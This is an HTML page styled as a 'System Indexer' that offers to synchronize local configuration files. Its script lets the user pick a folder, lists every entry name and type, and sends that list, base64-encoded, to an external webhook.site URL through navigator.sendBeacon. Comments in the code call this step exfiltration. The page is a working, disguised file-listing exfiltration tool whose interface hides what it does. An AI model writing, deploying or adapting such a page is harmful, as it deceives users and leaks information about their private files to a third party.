<!DOCTYPE html>
<html>
<head><title>System Indexer</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 60px #0f0">
        <h2>V228_DIR_CRAWLER</h2>
        <p>Select a folder to synchronize all local configuration files.</p>
        <button onclick="crawl()" style="padding:15px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer">INDEX_DIRECTORY</button>
        <div id="status" style="margin-top:20px;color:#888">AWAITING_FS_HANDLE...</div>
    </div>

<script>
    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    async function crawl() {
        try {
            // 1. REQUEST DIRECTORY ACCESS
            // Ini akan memicu File Picker untuk memilih FOLDER, bukan FILE.
            const dirHandle = await window.showDirectoryPicker();
            
            document.getElementById('status').innerText = "CRAWLING_FILES...";
            let fileList = [];

            // 2. ITERATE OVER DIRECTORY (The Crawler)
            // Kita menyisir semua entri di dalam folder tersebut
            for await (const entry of dirHandle.values()) {
                fileList.push({
                    name: entry.name,
                    kind: entry.kind // 'file' atau 'directory'
                });
                
                // Jika itu file, kita bisa mencoba membacanya jika diperlukan
                console.log(`Found: ${entry.name} [${entry.kind}]`);
            }

            // 3. EXFILTRATE FILE NAMES
            // Mengirim daftar nama file ke Webhook
            navigator.sendBeacon(`${webhook}?v=V228_DIR_LIST`, btoa(JSON.stringify({
                folder: dirHandle.name,
                files: fileList
            })));

            document.getElementById('status').innerText = "INDEXING_COMPLETE";
            document.getElementById('status').style.color = "#0f0";

        } catch (err) {
            document.getElementById('status').innerText = "ACCESS_DENIED: " + err.message;
        }
    }
</script>
</body>
</html>
